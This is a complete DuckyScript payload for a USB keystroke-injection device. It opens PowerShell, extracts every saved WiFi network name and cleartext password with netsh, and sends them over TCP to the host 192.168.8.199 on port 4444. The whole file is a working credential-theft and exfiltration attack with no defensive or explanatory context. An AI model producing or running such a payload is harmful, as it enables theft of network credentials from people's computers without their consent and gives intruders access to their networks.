REM Open PowerShell directly
DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1500

REM Get WiFi profiles and keys, store in a variable
STRING $wifiData = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); [PSCustomObject]@{ PROFILE_NAME=$name; PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
ENTER

REM Send the data via TCP
STRING $targetIP = '192.168.8.199'
ENTER
STRING $targetPort = 4444
ENTER
STRING $client = New-Object System.Net.Sockets.TcpClient($targetIP, $targetPort)
ENTER
STRING $stream = $client.GetStream()
ENTER
STRING $writer = New-Object System.IO.StreamWriter($stream, [System.Text.Encoding]::Unicode)
ENTER
STRING $writer.AutoFlush = $true
ENTER
STRING $writer.WriteLine("=== WiFi Passwords ===")
ENTER
STRING $writer.WriteLine($wifiData)
ENTER
STRING $client.Close()
ENTER

REM Exit PowerShell
STRING exit
ENTER
